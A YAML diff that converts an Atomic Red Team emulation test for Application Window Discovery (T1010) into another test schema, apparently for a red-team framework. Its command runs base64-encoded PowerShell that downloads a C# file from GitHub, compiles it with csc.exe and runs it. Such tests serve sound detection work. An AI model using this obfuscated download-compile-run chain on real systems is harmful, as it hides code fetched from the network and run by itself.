@@ -1,24 +1,20 @@
-- id: e8f3a481-6c4c-56c0-ac1a-8e28b384978e
+- requirements: []
   name: Soumaia ART Tests - List Process Main Windows - C# .NET
   description: 'Compiles and executes C# code to list main window titles associated with each process.
 
 
     Upon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.'
   tactic: discovery
-  technique:
-    attack_id: T1010
-    name: Application Window Discovery
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADEAMAAuAGMAcwAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAAxADAALgBjAHMAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADAAMQAwAC8AcwByAGMALwBUADEAMAAxADAALgBjAHMAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMAAxADAALgBjAHMAIgAKAA==
-          )
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe ".\T1010.cs"
-          %TEMP%\T1010.exe
-        cleanup: |-
-          del /f /q /s %TEMP%\T1010.exe >nul 2>&1
-        payloads:
-        - T1010.cs
+  technique_id: T1010
+  technique_name: Application Window Discovery
+  executors:
+  - cleanup:
+    - del /f /q /s %TEMP%\T1010.exe >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - T1010.cs
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADEAMAAuAGMAcwAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAAxADAALgBjAHMAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADAAMQAwAC8AcwByAGMALwBUADEAMAAxADAALgBjAHMAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMAAxADAALgBjAHMAIgAKAA== ) & C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe ".\T1010.cs" & %TEMP%\T1010.exe
+  id: e8f3a481-6c4c-56c0-ac1a-8e28b384978e
